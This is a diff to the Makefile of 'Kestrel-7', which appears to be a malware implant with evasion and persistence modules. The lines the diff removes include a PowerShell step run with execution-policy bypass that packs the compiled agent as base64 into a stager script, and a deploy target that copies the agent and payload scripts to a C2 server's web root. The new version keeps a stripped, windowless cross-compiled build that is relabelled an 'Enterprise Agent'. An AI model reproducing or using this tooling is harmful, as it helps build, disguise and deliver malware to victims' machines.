@@ -1,119 +1,46 @@
-# Makefile - Cross-platform build for Kestrel-7
-# Usage: make (debug) | make release | make clean | make deploy
-
-CC = cl.exe
-CXX = cl.exe
-RC = rc.exe
-LINK = link.exe
+# Makefile - Kestrel-7 Multi-Platform Agent Build Suite
+# Compatible with MSVC (cl.exe) on Windows and MinGW-w64 (x86_64-w64-mingw32-g++) on Linux
 
 TARGET = kestrel7_agent.exe
-TARGET_DLL = kestrel7_dll.dll
+BIN_DIR = bin
+SRC_DIR = src
+SRCS = $(SRC_DIR)/main.cpp $(SRC_DIR)/crypto.cpp $(SRC_DIR)/network.cpp $(SRC_DIR)/evasion.cpp $(SRC_DIR)/persistence.cpp $(SRC_DIR)/utils.cpp
 
-# Compiler flags
-CFLAGS = /EHsc /MT /O2 /GS- /DNDEBUG /D_WIN32_WINNT=0x0A00
-CFLAGS_DEBUG = /EHsc /MTd /Od /GS- /Zi /D_DEBUG /D_WIN32_WINNT=0x0A00
+# Detect environment / compiler
+ifeq ($(OS),Windows_NT)
+    CXX ?= cl.exe
+    MKDIR = if not exist $(BIN_DIR) mkdir $(BIN_DIR)
+    RM = rmdir /s /q $(BIN_DIR) 2>nul
+    CFLAGS = /EHsc /MT /O2 /GS- /DNDEBUG /D_WIN32_WINNT=0x0A00 /Fe:$(BIN_DIR)/$(TARGET)
+    LIBS = ws2_32.lib winhttp.lib advapi32.lib bcrypt.lib psapi.lib user32.lib
+    BUILD_CMD = $(CXX) $(CFLAGS) $(SRCS) /link $(LIBS)
+else
+    CXX ?= x86_64-w64-mingw32-g++
+    MKDIR = mkdir -p $(BIN_DIR)
+    RM = rm -rf $(BIN_DIR)
+    CFLAGS = -O2 -s -DNDEBUG -D_WIN32_WINNT=0x0A00 -mwindows -static -static-libgcc -static-libstdc++
+    LIBS = -lws2_32 -lwinhttp -ladvapi32 -lbcrypt -lpsapi -luser32
+    BUILD_CMD = $(CXX) $(CFLAGS) $(SRCS) -o $(BIN_DIR)/$(TARGET) $(LIBS)
+endif
 
-# Linker flags
-LFLAGS = /NXCOMPAT /DYNAMICBASE /OPT:REF /OPT:ICF /LTCG
-LFLAGS_DEBUG = /DEBUG /PDB:$(TARGET).pdb
-
-# Libraries
-LIBS = ws2_32.lib winhttp.lib advapi32.lib wbemuuid.lib psapi.lib user32.lib
-
-# Source files
-SRCS = src/main.cpp src/crypto.cpp src/network.cpp src/evasion.cpp src/persistence.cpp src/utils.cpp
-OBJS = $(SRCS:src/%.cpp=bin/obj/%.obj)
-
-# Default target
 all: release
 
-# Release build
-release: CFLAGS += /GL
-release: LFLAGS += /LTCG
-release: $(TARGET)
+release:
+	@$(MKDIR)
+	@echo [*] Compiling Kestrel-7 Enterprise Agent ($(TARGET))...
+	$(BUILD_CMD)
+	@echo [+] Build complete: $(BIN_DIR)/$(TARGET)
 
-# Debug build
-debug: CFLAGS = $(CFLAGS_DEBUG)
-debug: LFLAGS = $(LFLAGS_DEBUG)
-debug: $(TARGET)
-
-# Rule for building object files
-bin/obj/%.obj: src/%.cpp
-	@if not exist bin\obj mkdir bin\obj
-	$(CXX) /c $(CFLAGS) /Fo$@ $<
-
-# Link target
-$(TARGET): $(OBJS)
-	$(LINK) $(LFLAGS) $(OBJS) $(LIBS) /OUT:bin/$@
-	@echo [*] Build complete: bin/$(TARGET)
-	@dir bin\$(TARGET) | find "$(TARGET)"
-
-# Build DLL version
-dll: CFLAGS += /GL /D_DLL
-dll: LFLAGS += /DLL
-dll: $(OBJS)
-	$(LINK) /DLL $(LFLAGS) $(OBJS) $(LIBS) /OUT:bin/$(TARGET_DLL)
-	@echo [*] DLL build complete: bin/$(TARGET_DLL)
-
-# Generate stagers
-stagers: $(TARGET)
-	@echo [*] Generating stagers...
-	@powershell -exec bypass -Command " \
-		$$bytes = [IO.File]::ReadAllBytes('bin\$(TARGET)'); \
-		$$b64 = [Convert]::ToBase64String($$bytes); \
-		$$stager = Get-Content payloads\stager.ps1 -Raw; \
-		$$stager = $$stager -replace 'BASE64_ENCODED_SHELLCODE_HERE', $$b64; \
-		$$stager | Out-File payloads\stager_final.ps1 -Encoding ASCII"
-	@echo [*] Stagers generated in payloads/
-
-# Deploy to remote server
-deploy: release stagers
-	@echo [*] Deploying to C2 server...
-	scp bin/$(TARGET) user@c2-server:/var/www/html/agent.exe
-	scp payloads/*.ps1 user@c2-server:/var/www/html/
-	scp payloads/*.xml user@c2-server:/var/www/html/
-	@echo [*] Deployment complete
-
-# Clean build artifacts
 clean:
-	@if exist bin rmdir /s /q bin
-	@if exist payloads\*_final.* del payloads\*_final.*
-	@echo [*] Clean complete
+	@echo [*] Cleaning build artifacts...
+	@$(RM)
 
-# Full clean (includes stagers)
-distclean: clean
-	@del payloads\*.ps1 payloads\*.xml payloads\*.vbs payloads\*.hta 2>nul
-	@echo [*] Distclean complete
-
-# Run the agent
-run: release
-	bin\$(TARGET) --install
-
-# Test in sandbox
-test: debug
-	@echo [*] Running tests...
-	bin\$(TARGET) --test
-
-# Generate documentation
-docs:
-	doxygen Doxyfile 2>nul || echo [*] Doxygen not installed
-
-# Help
 help:
-	@echo ============================================
-	@echo   Kestrel-7 Makefile
-	@echo ============================================
-	@echo.
-	@echo make release     - Build optimized release (default)
-	@echo make debug       - Build debug version with symbols
-	@echo make dll         - Build DLL version
-	@echo make stagers     - Generate stager scripts
-	@echo make deploy      - Deploy to C2 server
-	@echo make clean       - Remove build artifacts
-	@echo make distclean   - Full clean
-	@echo make run         - Build and run
-	@echo make test        - Build and test
-	@echo make docs        - Generate Doxygen docs
-	@echo.
+	@echo =======================================================
+	@echo   Kestrel-7 Windows 11 Enterprise Agent Makefile
+	@echo =======================================================
+	@echo   make release   - Build release binary (bin/kestrel7_agent.exe)
+	@echo   make clean     - Clean build directory
+	@echo =======================================================
 
-.PHONY: all release debug dll stagers deploy clean distclean run test docs help
+.PHONY: all release clean help
